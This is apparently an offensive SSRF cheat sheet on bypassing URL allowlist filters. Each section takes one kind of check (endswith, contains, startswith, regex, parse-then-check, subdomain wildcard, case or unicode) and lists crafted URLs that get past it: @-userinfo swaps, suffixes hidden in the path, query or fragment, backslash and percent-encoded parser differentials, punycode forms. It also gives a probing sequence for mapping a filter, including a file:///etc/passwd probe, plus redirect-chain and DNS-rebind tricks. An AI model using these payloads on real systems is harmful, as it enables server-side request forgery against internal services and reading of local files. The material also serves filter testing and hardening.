# Whitelist shapes — the allowlist bypasses

"Only these hosts may be fetched" — the allowlist is the strongest
common filter and the most bypassable when implemented naively.

---

## 1. The allowlist-check shapes — how it's coded

```text
exact-match:      host == "example.com"
suffix-match:     host.endswith(".example.com")
contains:         "example.com" in host or "example.com" in url
subdomain-match:  is-subdomain(host, "example.com")
regex-match:      re.match(r"^https?://(www\.)?example\.com", url)
starts-with:      url.startswith("http://example.com")
parse-then-check: urlparse(url).host == "example.com" — the strict
                  one — the host-field itself must match — the
                  bypass is the parser-differential not the string
resolve-then-check: the resolved-IP must equal the allowed-IP —
                  the airtight one — rebind or nothing
```

## 2. The endswith-family — `.example.com` appended anywhere

```text
the check: host.endswith(".example.com")
bypass:    make a host that ENDS with it but isn't it —
   attacker-example.com? no — needs the .example.com suffix —
   your-own-subdomain:
     internal.example.com.attacker.com — ENDS with .attacker.com
       not .example.com — doesn't pass
     the bypass needs a NAME under the allowed-domain you control:
       you.example.com — needs dns-control of a subdomain — no
     OR a parser-trick: make the parse-read a host that ends with
       it while the fetch reads a different host:
       http://internal@example.com/ — parser-host=example.com?
       http://internal.example.com@x/ — ends-with check on the
         WRONG half — the userinfo-vs-host confusion again
     the REAL bypass for endswith: the check reads the WRONG
       field — urlparse("http://internal.example.com@x/").hostname
       = x — the @-splits — or the suffix-check runs on the
       RAW-STRING not the parsed-host — the url-string ends with
       .example.com because you put it in a path/query:
       http://internal/path/.example.com — endswith on the STRING
       http://internal?q=.example.com    — the query-form
       http://internal#.example.com       — the fragment-form
```

The discrimination: does the check `endswith` the STRING or the
PARSED-HOST? — send `http://internal/.example.com` — if it passes,
the check is string-level → any suffix-position works.

## 3. The contains-family — the substring-in-any-position

```text
the check: "example.com" in url — substring-anywhere:
  http://evil.com/example.com         — the path-form
  http://evil.com?q=example.com       — the query-form
  http://evil.com#example.com         — the fragment-form
  http://example.com.evil.com/        — the subdomain-form — the
                                        name CONTAINS example.com
                                        — the check is fooled —
                                        resolves to attacker!
  http://evil.com@example.com/
  http://user:example.com@evil.com/
  http://xexample.com/                 — contains "example.com"
                                        — x+example.com — the
                                        prefix-token — doesn't end
                                        the host — the dns is x-
                                        example.com — your domain —
                                        contains-the-token
  http://notexample.com/
  http://example.com.attacker.com/
  http://attacker.com%2fexample.com/
```

The `xexample.com`/`notexample.com` trick — the allowed-token is
INSIDE your-domain — the check is substring not domain-boundary —
any domain containing the literal passes.

## 4. The startswith-family — the prefix-check

```text
the check: url.startswith("http://example.com") —
  http://example.com@internal/        — the @-swap — starts right —
                                        the host is internal — the
                                        string starts with the
                                        allowed-prefix — the classic
  http://example.com.evil.com/         — starts-with the prefix —
                                        host is the subdomain —
                                        attacker-controlled
  http://example.com.attacker.com/
  http://example.comX/                 — the boundary-trick —
                                        example.comX — not a real
                                        boundary — but contains the
                                        prefix — resolves to X
  http://example.com\@internal/        — backslash
  http://example.com%2f@internal/      — encoded-slash
  http://example.com#@internal/        — fragment-@
  http://example.com?@internal/        — query-@
  http://example.com/.@internal/       — path-@
  http://example.com%00@internal/      — null-@
```

## 5. The regex-family — where the regex is loose

```text
re.match(r"https?://example\.com")   — anchors-left — anything
                                        after — the suffix-tricks
re.match(r"^https?://(www\.)?example\.com(:\d+)?(/.*)?$")
                                      — the STRICT one — the host
                                        is literally the domain —
                                        the parser-differential is
                                        the only door
re.match(r"example\.com")             — no-anchor — the contains-
                                        tricks
re.match(r"^https?://[\w.]*example\.com")  — [\w.]* — the subdomain-
                                        wildcard — internal.example.
                                        com — you need dns-control —
                                        or the @/dots tricks
```

The regex-check on the STRING vs the PARSED field is the split —
a regex on the raw-url is fooled by putting the token anywhere.

## 6. The parse-then-check bypass — the differential

```text
the check does urlparse(url).host == "example.com" — the host-
FIELD is compared — the bypass is making the two parsers disagree:

http://example.com@internal/   — python-urlparse: host=internal —
                                 the check fails — BUT the check
                                 uses a DIFFERENT parser? — the
                                 app's validator may be the SAME
                                 language — the two-parser game
                                 needs two DIFFERENT parsers —
                                 app-validates-in-php, fetches-
                                 with-curl — different splits

http://internal\@example.com/  — \-as-/ — curl treats \ as / —
                                 fetcher-host=internal — validator
                                 reads host=example.com
http://internal%5c@example.com/ — encoded-\
http://internal%40example.com/  — encoded-@ — the literal-vs-
                                  decoded split — the validator
                                  checks "example.com" — the @ is
                                  %-encoded — the fetcher decodes —
                                  the userinfo-splits
```

## 7. The subdomain-trust — the `*.example.com` wildcard

```text
the check trusts subdomains — "any *.example.com" — the bypass
  needs a subdomain under your control → any name under attacker-
  controlled example.com? — you don't control example.com —
  the bypass needs a subdomain the CHECK thinks is valid:
    http://internal.example.com.attacker.com — ends .attacker.com
      — fails endswith-.example.com
    http://example.com.attacker.com — ends .attacker.com — fails
    a real subdomain of a domain you control that the check's
      LIST contains — the allowed-list may include other-domains —
      read the allowed-list
  OR — the wildcard-matching is loose — `*.example.com` matching
    `evil-example.com`? the wildcard-syntax matters — fnmatch vs
    dns-aware — `*example.com` pattern vs `*.example.com`
```

## 8. The case/unicode-domain family

```text
the domain-name system is case-insensitive — the check might be:
  http://EXAMPLE.COM@internal/        — case in the allowed-token
  http://example.COM@internal/
  http://ｅｘａｍｐｌｅ.com@internal/        — fullwidth
  http://exa%6dple.com@internal/      — %-encoded-letters
  http://%65xample.com/
  the check's case-handling vs the resolver's — idn-punycode —
  http://xn--xample-9ua.com/ — punycode-forms
```

## 9. The resolve-then-check — the airtight one

```text
resolve(host) → ip == allowed-ip → fetch
   — the ip is pinned — no string-trick — only the REBIND —
     the resolve-twice race — dns-rebind.md — or the mechanism-
     switch (redirect/parser-diff/different-scheme)
```

## 10. The "allow any subdomain of OUR domain" trap

```text
when the allowed-domain is the APP's OWN domain — and the app is
vulnerable → the allowed-subdomain trick:
   - the app's open-redirect ON the allowed-domain — the internal
     redirect — the chain
   - a subdomain-of-the-app that's internal-only —
     admin.app.com? — resolves only inside — the internal-dns —
     the name is "trusted" AND internal
   - the app's own proxy/route on the allowed-domain — the
     ssrf-inside-ssrf — /proxy?u=
```

## 11. The allowlist-inventory — map the list first

```text
don't guess the check — MAP it:
  send url=http://example.com/        → allowed? baseline
  send url=http://sub.example.com/     → subdomains?
  send url=http://example.com.evil.com/ → contains-check?
  send url=http://evil.com/example.com/ → string-position?
  send url=http://internal@example.com/ → the @-split
  send url=http://EXAMPLE.COM/          → case?
  send url=file:///etc/passwd           → scheme-locked?
the ACCEPT/REJECT pattern identifies the check-shape → the right
family
```

## 12. The redirect-to-allowed trick — the reverse

```text
the check wants the url to resolve to an allowed-ip — the
redirect: fetch the allowed-url → the ALLOWED-server 302s to
internal → the fetcher follows → the redirect-chain — the check
saw the allowed-entry — the hop wasn't checked — redirect-chains.md
```
